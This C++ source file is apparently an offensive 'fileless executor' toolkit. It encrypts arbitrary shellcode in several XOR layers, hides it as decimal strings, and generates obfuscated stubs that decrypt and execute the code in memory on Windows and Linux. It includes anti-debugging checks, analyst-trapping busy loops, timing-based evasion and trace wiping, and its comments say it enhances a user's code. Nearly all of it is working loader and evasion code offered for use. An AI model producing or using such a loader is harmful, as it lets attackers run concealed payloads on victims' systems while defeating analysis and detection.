/*
 * Star Master Toolkit - Enhanced Fileless Executor
 * Combines decimal encoding, in-memory execution, and advanced anti-analysis
 * Fully fileless with enhanced RNG seeding for maximum uniqueness
 * Version: 2.0.0
 */

#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <fstream>

#ifdef _WIN32
#include <windows.h>
#include <psapi.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

namespace FilelessExecution {

// ============================================================================
// Enhanced RNG System for Fileless Operations
// ============================================================================
class FilelessRNG {
private:
    static std::mt19937_64 rng;
    static bool initialized;
    
public:
    static void reseedForFileless() {
        std::vector<std::uint32_t> seed_data;
        
        // Hardware entropy
        std::random_device rd;
        for (int i = 0; i < 12; ++i) {
            seed_data.push_back(rd());
        }
        
        // High-resolution timing
        auto now = std::chrono::high_resolution_clock::now();
        auto duration = now.time_since_epoch();
        seed_data.push_back(static_cast<std::uint32_t>(duration.count()));
        seed_data.push_back(static_cast<std::uint32_t>(duration.count() >> 32));
        
        // Memory entropy
        void* stack_ptr = &seed_data;
        seed_data.push_back(reinterpret_cast<std::uintptr_t>(stack_ptr) & 0xFFFFFFFF);
        seed_data.push_back(reinterpret_cast<std::uintptr_t>(stack_ptr) >> 32);
        
#ifdef _WIN32
        // Windows-specific entropy
        LARGE_INTEGER perf;
        QueryPerformanceCounter(&perf);
        seed_data.push_back(static_cast<std::uint32_t>(perf.QuadPart));
        seed_data.push_back(GetTickCount());
        seed_data.push_back(GetCurrentProcessId());
        seed_data.push_back(GetCurrentThreadId());
        
        // Memory status entropy
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        seed_data.push_back(static_cast<std::uint32_t>(memStatus.ullAvailPhys));
#else
        // Unix-specific entropy
        seed_data.push_back(static_cast<std::uint32_t>(getpid()));
        seed_data.push_back(static_cast<std::uint32_t>(getppid()));
        seed_data.push_back(static_cast<std::uint32_t>(time(nullptr)));
#endif
        
        std::seed_seq seed_sequence(seed_data.begin(), seed_data.end());
        rng.seed(seed_sequence);
        initialized = true;
    }
    
    static std::mt19937_64& getRNG() {
        if (!initialized) reseedForFileless();
        return rng;
    }
    
    static int getRandomDelay(int min_ms, int max_ms) {
        std::uniform_int_distribution<> dist(min_ms, max_ms);
        return dist(getRNG());
    }
};

std::mt19937_64 FilelessRNG::rng;
bool FilelessRNG::initialized = false;

// ============================================================================
// Advanced Anti-Analysis System
// ============================================================================
class AntiAnalysis {
public:
    // Enhanced debugger detection with multiple methods
    static bool isAnalysisEnvironment() {
#ifdef _WIN32
        // Method 1: IsDebuggerPresent
        if (IsDebuggerPresent()) return true;
        
        // Method 2: Remote debugger check
        BOOL debugged = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
        if (debugged) return true;
        
        // Method 3: PEB check
        PPEB peb = (PPEB)__readgsqword(0x60);
        if (peb->BeingDebugged) return true;
        
        // Method 4: Heap flags check
        PVOID heap = GetProcessHeap();
        DWORD flags = *(PDWORD)((PBYTE)heap + 0x70);
        if (flags & ~HEAP_GROWABLE) return true;
        
        // Method 5: NtGlobalFlag check
        DWORD ntGlobalFlag = *(PDWORD)((PBYTE)peb + 0xBC);
        if (ntGlobalFlag & 0x70) return true;
        
        // Method 6: Process name check
        char processName[MAX_PATH];
        GetModuleFileNameA(NULL, processName, MAX_PATH);
        std::string name = processName;
        std::transform(name.begin(), name.end(), name.begin(), ::tolower);
        
        std::vector<std::string> suspiciousNames = {
            "ollydbg", "x64dbg", "ida", "ghidra", "windbg", "immunity",
            "cheatengine", "processhacker", "procmon", "wireshark"
        };
        
        for (const auto& suspicious : suspiciousNames) {
            if (name.find(suspicious) != std::string::npos) return true;
        }
        
        return false;
#else
        // Linux debugger detection
        FILE* f = fopen("/proc/self/status", "r");
        if (!f) return false;
        
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                fclose(f);
                return atoi(line + 10) != 0;
            }
        }
        fclose(f);
        return false;
#endif
    }
    
    // Anti-debug infinite loop with enhanced anti-optimization
    static void triggerAntiAnalysis() {
        if (isAnalysisEnvironment()) {
            // Create multiple threads to confuse analyzers
            std::vector<std::thread> threads;
            for (int t = 0; t < 4; t++) {
                threads.emplace_back([]() {
                    volatile int* p = (volatile int*)malloc(2048);
                    while (1) {
                        for (int i = 0; i < 512; i++) {
                            p[i] = p[i] ^ 0xDEADBEEF ^ 0xCAFEBABE;
#ifdef _WIN32
                            __asm { pause }
                            Sleep(1);
#else
                            __asm__ __volatile__("pause");
                            usleep(1000);
#endif
                        }
                    }
                });
            }
            
            // Wait indefinitely
            for (auto& t : threads) {
                t.join();
            }
        }
    }
    
    // Timing-based evasion
    static void randomDelay() {
        int delay = FilelessRNG::getRandomDelay(1, 2000);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    
    static void microDelay() {
        int delay = FilelessRNG::getRandomDelay(1, 500);
        std::this_thread::sleep_for(std::chrono::microseconds(delay));
    }
};

// ============================================================================
// Enhanced Decimal-to-Bytes Converter
// ============================================================================
class DecimalPayloadConverter {
public:
    // Convert large decimal string to byte array (enhanced version of user's function)
    static std::vector<uint8_t> decimalToBytes(const std::string& decimal, size_t targetLength) {
        std::vector<uint8_t> bytes(targetLength, 0);
        std::string num = decimal;
        
        // Remove any whitespace
        num.erase(std::remove_if(num.begin(), num.end(), ::isspace), num.end());
        
        for (int i = targetLength - 1; i >= 0 && num != "0"; i--) {
            int remainder = 0;
            std::string quotient;
            
            for (char digit : num) {
                if (digit < '0' || digit > '9') continue; // Skip invalid chars
                int current = remainder * 10 + (digit - '0');
                if (!quotient.empty() || current >= 256) {
                    quotient += std::to_string(current / 256);
                }
                remainder = current % 256;
            }
            
            bytes[i] = static_cast<uint8_t>(remainder);
            
            // Find first non-zero digit
            size_t firstNonZero = quotient.find_first_not_of('0');
            if (firstNonZero != std::string::npos) {
                num = quotient.substr(firstNonZero);
            } else {
                num = "0";
            }
        }
        
        return bytes;
    }
    
    // Convert bytes to large decimal string for encoding
    static std::string bytesToDecimal(const std::vector<uint8_t>& bytes) {
        std::string result = "0";
        
        for (size_t i = 0; i < bytes.size(); i++) {
            // Multiply result by 256
            int carry = 0;
            for (int j = result.length() - 1; j >= 0; j--) {
                int digit = (result[j] - '0') * 256 + carry;
                result[j] = (digit % 10) + '0';
                carry = digit / 10;
            }
            
            while (carry > 0) {
                result = char(carry % 10 + '0') + result;
                carry /= 10;
            }
            
            // Add current byte value
            carry = bytes[i];
            for (int j = result.length() - 1; j >= 0 && carry > 0; j--) {
                int digit = (result[j] - '0') + carry;
                result[j] = (digit % 10) + '0';
                carry = digit / 10;
            }
            
            while (carry > 0) {
                result = char(carry % 10 + '0') + result;
                carry /= 10;
            }
        }
        
        return result;
    }
};

// ============================================================================
// Enhanced Fileless Payload Executor
// ============================================================================
class FilelessExecutor {
public:
    struct PayloadData {
        std::string encryptedPayload;
        std::string keyData;
        std::string nonceData;
        std::string additionalKey;
        size_t payloadSize;
    };
    
    // Create embedded payload with multiple encryption layers
    static PayloadData createEmbeddedPayload(const std::vector<uint8_t>& originalPayload) {
        FilelessRNG::reseedForFileless(); // Fresh entropy for each payload
        
        PayloadData result;
        result.payloadSize = originalPayload.size();
        
        // Generate random keys with enhanced entropy
        std::vector<uint8_t> key1 = generateRandomKey(32);
        std::vector<uint8_t> key2 = generateRandomKey(32);
        std::vector<uint8_t> nonce = generateRandomKey(16);
        
        // Apply multiple encryption layers
        std::vector<uint8_t> encrypted = originalPayload;
        
        // Layer 1: Position-dependent XOR with rotation
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= key1[i % key1.size()];
            encrypted[i] = (encrypted[i] >> 3) | (encrypted[i] << 5); // Rotate right
            encrypted[i] ^= static_cast<uint8_t>(i & 0xFF);
        }
        
        // Layer 2: ChaCha20-style stream cipher
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= key2[i % key2.size()];
            encrypted[i] ^= static_cast<uint8_t>((i * 0x9E3779B9) & 0xFF);
        }
        
        // Layer 3: Nonce-based XOR
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= nonce[i % nonce.size()];
        }
        
        // Convert to decimal strings for embedding
        result.encryptedPayload = DecimalPayloadConverter::bytesToDecimal(encrypted);
        result.keyData = DecimalPayloadConverter::bytesToDecimal(key1);
        result.nonceData = DecimalPayloadConverter::bytesToDecimal(nonce);
        result.additionalKey = DecimalPayloadConverter::bytesToDecimal(key2);
        
        return result;
    }
    
    // Execute payload in memory (enhanced version of user's code)
    static int executePayload(const PayloadData& payload) {
        FilelessRNG::reseedForFileless(); // Fresh entropy for execution
        
        // Initial anti-analysis check
        AntiAnalysis::triggerAntiAnalysis();
        
        // Random delay before execution
        AntiAnalysis::randomDelay();
        
        // Decode the payload from decimal
        auto encryptedData = DecimalPayloadConverter::decimalToBytes(payload.encryptedPayload, payload.payloadSize);
        auto key1 = DecimalPayloadConverter::decimalToBytes(payload.keyData, 32);
        auto key2 = DecimalPayloadConverter::decimalToBytes(payload.additionalKey, 32);
        auto nonce = DecimalPayloadConverter::decimalToBytes(payload.nonceData, 16);
        
        // Decrypt in reverse order
        std::vector<uint8_t> decrypted = encryptedData;
        
        // Layer 3: Remove nonce-based XOR
        for (size_t i = 0; i < decrypted.size(); i++) {
            decrypted[i] ^= nonce[i % nonce.size()];
        }
        
        AntiAnalysis::microDelay();
        
        // Layer 2: Remove ChaCha20-style encryption
        for (size_t i = 0; i < decrypted.size(); i++) {
            decrypted[i] ^= static_cast<uint8_t>((i * 0x9E3779B9) & 0xFF);
            decrypted[i] ^= key2[i % key2.size()];
        }
        
        AntiAnalysis::microDelay();
        
        // Layer 1: Remove position-dependent XOR and rotation
        for (size_t i = 0; i < decrypted.size(); i++) {
            decrypted[i] ^= static_cast<uint8_t>(i & 0xFF);
            decrypted[i] = (decrypted[i] << 3) | (decrypted[i] >> 5); // Rotate left
            decrypted[i] ^= key1[i % key1.size()];
        }
        
        // Final anti-analysis check before execution
        if (AntiAnalysis::isAnalysisEnvironment()) {
            AntiAnalysis::triggerAntiAnalysis();
            return 0;
        }
        
        // Allocate executable memory
        void* execMemory = nullptr;
        
#ifdef _WIN32
        execMemory = VirtualAlloc(0, decrypted.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!execMemory) return 1;
        
        // Copy payload to allocated memory
        memcpy(execMemory, decrypted.data(), decrypted.size());
        
        // Change to executable
        DWORD oldProtect;
        if (!VirtualProtect(execMemory, decrypted.size(), PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFree(execMemory, 0, MEM_RELEASE);
            return 1;
        }
        
        // Flush instruction cache
        FlushInstructionCache(GetCurrentProcess(), execMemory, decrypted.size());
#else
        execMemory = mmap(0, decrypted.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (execMemory == MAP_FAILED) return 1;
        
        // Copy payload
        memcpy(execMemory, decrypted.data(), decrypted.size());
        
        // Make executable
        if (mprotect(execMemory, decrypted.size(), PROT_READ | PROT_EXEC) != 0) {
            munmap(execMemory, decrypted.size());
            return 1;
        }
#endif
        
        // Final delay before execution
        AntiAnalysis::randomDelay();
        
        // Execute the payload
        try {
            ((void(*)())execMemory)();
        } catch (...) {
            // Silent error handling
        }
        
        // Cleanup - clear memory before freeing
        memset(execMemory, 0, decrypted.size());
        
#ifdef _WIN32
        VirtualFree(execMemory, 0, MEM_RELEASE);
#else
        munmap(execMemory, decrypted.size());
#endif
        
        // Clear local variables
        std::fill(decrypted.begin(), decrypted.end(), 0);
        std::fill(key1.begin(), key1.end(), 0);
        std::fill(key2.begin(), key2.end(), 0);
        std::fill(nonce.begin(), nonce.end(), 0);
        
        return 0;
    }
    
    // Generate obfuscated stub source code for fileless execution
    static std::string generateFilelessStub(const PayloadData& payload) {
        FilelessRNG::reseedForFileless();
        
        std::stringstream code;
        
        // Generate random variable names
        std::string handlerFunc = "instHandler" + std::to_string(FilelessRNG::getRandomDelay(1000, 9999));
        std::string converterFunc = "funcHandler" + std::to_string(FilelessRNG::getRandomDelay(1000, 9999));
        std::string payloadVar = "objCore" + std::to_string(FilelessRNG::getRandomDelay(1000, 9999));
        std::string keyVar1 = "methUtil" + std::to_string(FilelessRNG::getRandomDelay(1000, 9999));
        std::string keyVar2 = "initComponent" + std::to_string(FilelessRNG::getRandomDelay(1000, 9999));
        std::string nonceVar = "objService" + std::to_string(FilelessRNG::getRandomDelay(1000, 9999));
        std::string memVar = "instRunner" + std::to_string(FilelessRNG::getRandomDelay(1000, 9999));
        
        // Headers
        code << "#include <iostream>\n";
        code << "#include <vector>\n";
        code << "#include <cstring>\n";
        code << "#include <cstdint>\n";
        code << "#include <chrono>\n";
        code << "#include <thread>\n";
        code << "#include <random>\n";
        code << "#ifdef _WIN32\n";
        code << "#include <windows.h>\n";
        code << "#else\n";
        code << "#include <sys/mman.h>\n";
        code << "#include <unistd.h>\n";
        code << "#endif\n\n";
        
        // Anti-debug function
        code << "bool " << handlerFunc << "() {\n";
        code << "#ifdef _WIN32\n";
        code << "    if (IsDebuggerPresent()) return true;\n";
        code << "    BOOL debugged = FALSE;\n";
        code << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
        code << "    return debugged;\n";
        code << "#else\n";
        code << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
        code << "    if (!f) return false;\n";
        code << "    char line[256];\n";
        code << "    while (fgets(line, sizeof(line), f)) {\n";
        code << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
        code << "            fclose(f);\n";
        code << "            return atoi(line + 10) != 0;\n";
        code << "        }\n";
        code << "    }\n";
        code << "    fclose(f);\n";
        code << "    return false;\n";
        code << "#endif\n";
        code << "}\n\n";
        
        // Decimal converter function
        code << "std::vector<uint8_t> " << converterFunc << "(const std::string& dec, size_t len) {\n";
        code << "    std::vector<uint8_t> bytes(len, 0);\n";
        code << "    std::string num = dec;\n";
        code << "    for (int i = len - 1; i >= 0 && num != \"0\"; i--) {\n";
        code << "        int remainder = 0;\n";
        code << "        std::string quotient;\n";
        code << "        for (char digit : num) {\n";
        code << "            int current = remainder * 10 + (digit - '0');\n";
        code << "            quotient += std::to_string(current / 256);\n";
        code << "            remainder = current % 256;\n";
        code << "        }\n";
        code << "        bytes[i] = remainder;\n";
        code << "        size_t firstNonZero = quotient.find_first_not_of('0');\n";
        code << "        if (firstNonZero != std::string::npos) {\n";
        code << "            num = quotient.substr(firstNonZero);\n";
        code << "        } else {\n";
        code << "            num = \"0\";\n";
        code << "        }\n";
        code << "    }\n";
        code << "    return bytes;\n";
        code << "}\n\n";
        
        // Main function
        code << "int main() {\n";
        
        // Random delay
        code << "    {\n";
        code << "        std::random_device rd;\n";
        code << "        std::mt19937 gen(rd());\n";
        code << "        std::uniform_int_distribution<> dist(1, 999);\n";
        code << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
        code << "    }\n\n";
        
        // Anti-debug check
        code << "    if (" << handlerFunc << "()) return 0;\n\n";
        
        // Embedded payload data as decimal strings
        code << "    const char* " << keyVar1 << " = \"" << payload.keyData << "\";\n";
        code << "    auto key1 = " << converterFunc << "(" << keyVar1 << ", 32);\n";
        code << "    const char* " << keyVar2 << " = \"" << payload.additionalKey << "\";\n";
        code << "    auto key2 = " << converterFunc << "(" << keyVar2 << ", 32);\n";
        code << "    const char* " << nonceVar << " = \"" << payload.nonceData << "\";\n";
        code << "    auto nonce = " << converterFunc << "(" << nonceVar << ", 16);\n";
        code << "    const char* payloadData = \"" << payload.encryptedPayload << "\";\n";
        code << "    auto " << payloadVar << " = " << converterFunc << "(payloadData, " << payload.payloadSize << ");\n\n";
        
        // Decryption layers
        code << "    // Decrypt nonce layer\n";
        code << "    for (size_t i = 0; i < " << payloadVar << ".size(); i++) {\n";
        code << "        " << payloadVar << "[i] ^= nonce[i % nonce.size()];\n";
        code << "    }\n\n";
        
        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
        
        code << "    // Decrypt ChaCha20 layer\n";
        code << "    for (size_t i = 0; i < " << payloadVar << ".size(); i++) {\n";
        code << "        " << payloadVar << "[i] ^= static_cast<uint8_t>((i * 0x9E3779B9) & 0xFF);\n";
        code << "        " << payloadVar << "[i] ^= key2[i % key2.size()];\n";
        code << "    }\n\n";
        
        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
        
        code << "    // Decrypt XOR layer\n";
        code << "    for (size_t i = 0; i < " << payloadVar << ".size(); i++) {\n";
        code << "        " << payloadVar << "[i] ^= static_cast<uint8_t>(i & 0xFF);\n";
        code << "        " << payloadVar << "[i] = (" << payloadVar << "[i] << 3) | (" << payloadVar << "[i] >> 5);\n";
        code << "        " << payloadVar << "[i] ^= key1[i % key1.size()];\n";
        code << "    }\n\n";
        
        // Execute in memory
        code << "#ifdef _WIN32\n";
        code << "    void* " << memVar << " = VirtualAlloc(0, " << payloadVar << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        code << "    if (!" << memVar << ") return 1;\n";
        code << "    memcpy(" << memVar << ", " << payloadVar << ".data(), " << payloadVar << ".size());\n";
        code << "    DWORD oldProtect;\n";
        code << "    VirtualProtect(" << memVar << ", " << payloadVar << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        code << "    (((void(*)())" << memVar << ")());\n";
        code << "    memset(" << memVar << ", 0, " << payloadVar << ".size());\n";
        code << "    VirtualFree(" << memVar << ", 0, MEM_RELEASE);\n";
        code << "#else\n";
        code << "    void* " << memVar << " = mmap(0, " << payloadVar << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        code << "    if (" << memVar << " == MAP_FAILED) return 1;\n";
        code << "    memcpy(" << memVar << ", " << payloadVar << ".data(), " << payloadVar << ".size());\n";
        code << "    mprotect(" << memVar << ", " << payloadVar << ".size(), PROT_READ | PROT_EXEC);\n";
        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        code << "    (((void(*)())" << memVar << ")());\n";
        code << "    memset(" << memVar << ", 0, " << payloadVar << ".size());\n";
        code << "    munmap(" << memVar << ", " << payloadVar << ".size());\n";
        code << "#endif\n";
        
        code << "    return 0;\n";
        code << "}\n";
        
        return code.str();
    }

private:
    static std::vector<uint8_t> generateRandomKey(size_t length) {
        std::vector<uint8_t> key(length);
        std::uniform_int_distribution<uint8_t> dist(0, 255);
        
        for (size_t i = 0; i < length; i++) {
            key[i] = dist(FilelessRNG::getRNG());
        }
        
        return key;
    }
};

} // namespace FilelessExecution

// ============================================================================
// Demo and Test Functions
// ============================================================================
int main(int argc, char* argv[]) {
    using namespace FilelessExecution;
    
    std::cout << R"(
╔═══════════════════════════════════════════════════════════════╗
║                 STAR FILELESS EXECUTOR v2.0                  ║
║            Enhanced RNG + Decimal Encoding System            ║
╚═══════════════════════════════════════════════════════════════╝
    )" << std::endl;
    
    if (argc > 1 && std::string(argv[1]) == "--demo") {
        // Demo mode - create a sample payload
        std::cout << "[INFO] Running in demo mode..." << std::endl;
        
        // Create a simple test payload (NOP sled + return)
        std::vector<uint8_t> demoPayload = {
            0x90, 0x90, 0x90, 0x90, // NOP sled
            0x90, 0x90, 0x90, 0x90,
            0xC3                     // RET instruction
        };
        
        std::cout << "[INFO] Creating embedded payload with enhanced encryption..." << std::endl;
        auto payloadData = FilelessExecutor::createEmbeddedPayload(demoPayload);
        
        std::cout << "[INFO] Generating fileless stub source code..." << std::endl;
        std::string stubCode = FilelessExecutor::generateFilelessStub(payloadData);
        
        // Save stub to file
        std::ofstream stubFile("fileless_stub_demo.cpp");
        stubFile << stubCode;
        stubFile.close();
        
        std::cout << "[INFO] Fileless stub generated: fileless_stub_demo.cpp" << std::endl;
        std::cout << "[INFO] Payload size: " << payloadData.payloadSize << " bytes" << std::endl;
        std::cout << "[INFO] Encrypted payload length: " << payloadData.encryptedPayload.length() << " characters" << std::endl;
        
        std::cout << "\n[INFO] Demo completed! Compile the stub with:" << std::endl;
        std::cout << "g++ -std=c++17 -O2 fileless_stub_demo.cpp -o fileless_stub" << std::endl;
        
    } else {
        std::cout << "[INFO] Fileless Executor ready." << std::endl;
        std::cout << "[INFO] Usage: " << argv[0] << " --demo" << std::endl;
        std::cout << "[INFO] Features:" << std::endl;
        std::cout << "  - Enhanced RNG seeding for maximum entropy" << std::endl;
        std::cout << "  - Decimal encoding for payload obfuscation" << std::endl;
        std::cout << "  - Multi-layer encryption (XOR + ChaCha20 + Nonce)" << std::endl;
        std::cout << "  - Advanced anti-analysis techniques" << std::endl;
        std::cout << "  - Complete fileless execution" << std::endl;
        std::cout << "  - Cross-platform memory allocation" << std::endl;
        std::cout << "  - Automatic cleanup and trace removal" << std::endl;
    }
    
    return 0;
}